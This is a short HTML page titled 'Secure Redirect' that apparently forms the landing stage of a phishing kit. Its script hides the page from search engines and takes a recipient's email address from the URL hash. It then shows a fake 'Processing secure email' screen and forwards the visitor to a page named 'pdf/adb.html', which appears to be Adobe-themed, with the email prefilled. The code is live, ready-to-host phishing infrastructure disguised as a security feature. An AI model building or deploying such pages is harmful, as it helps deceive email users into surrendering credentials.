<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="robots" content="noindex, nofollow" />
  <meta name="googlebot" content="noindex, nofollow" />
  <title>Secure Redirect</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #1a202c;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: white;
    }
    .container {
      text-align: center;
      max-width: 500px;
      padding: 20px;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 10px;
      color: #4a6cf7;
    }
    .status {
      background: #2d3748;
      padding: 15px;
      border-radius: 8px;
      margin: 15px 0;
      font-size: 14px;
    }
    .loader {
      border: 3px solid #2d3748;
      border-top: 3px solid #4a6cf7;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Secure Redirect</h1>
    <div class="status" id="status">Processing secure email...</div>
    <div class="loader"></div>
  </div>

  <script>
    (function () {
      function generateSecureToken(length = 64) {
        const array = new Uint8Array(length / 2);
        window.crypto.getRandomValues(array);
        return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
      }

      function encodeData(data) {
        return btoa(encodeURIComponent(data))
          .replace(/\+/g, '-')
          .replace(/\//g, '_')
          .replace(/=+$/, '');
      }

      function isBase64(str) {
        // Check if string matches base64 pattern (including URL-safe base64)
        try {
          // First try to decode it
          const decoded = atob(str.replace(/-/g, '+').replace(/_/g, '/'));
          // If successful, check if it contains valid characters
          return true;
        } catch (e) {
          return false;
        }
      }

      function isValidEmail(email) {
        // Simple email validation regex
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
      }

      // Get the email from the URL hash
      const hash = window.location.hash.substring(1);
      
      let realEmail = "guest@example.com"; // default
      
      if (hash) {
        try {
          // Check if hash is already base64-encoded
          if (isBase64(hash)) {
            // Hash is base64, decode it
            const base64Email = hash.replace(/-/g, '+').replace(/_/g, '/');
            const decodedEmail = decodeURIComponent(atob(base64Email));
            
            // Validate the decoded email
            if (isValidEmail(decodedEmail)) {
              realEmail = decodedEmail;
            } else {
              console.warn("Decoded hash is not a valid email, treating as plain text");
              realEmail = hash;
            }
          } else {
            // Hash is not base64, treat as plain email
            if (isValidEmail(hash)) {
              realEmail = hash;
            } else {
              console.warn("Hash is not a valid email format");
              realEmail = hash; // Use as-is even if not valid email format
            }
          }
        } catch (e) {
          console.error("Error processing email from hash:", e);
          // If all else fails, use the hash as-is
          realEmail = hash;
        }
      }

      const token = generateSecureToken();

      sessionStorage.setItem("redirect_email", realEmail);
      sessionStorage.setItem("redirect_token", token);

      // Clear the hash from URL for security
      history.replaceState(null, "", window.location.pathname + window.location.search);

      // Re-encode the real email for the final redirect
      const encodedEmail = encodeData(realEmail);
      const redirectUrl = `pdf/adb.html#email=${encodedEmail}&token=${token}`;

      // Update status message
      document.getElementById('status').textContent = `Redirecting: ${realEmail}`;

      // Redirect after a brief delay
      setTimeout(() => {
        window.location.replace(redirectUrl);
      }, 2000);

    })();
  </script>
</body>

</html>
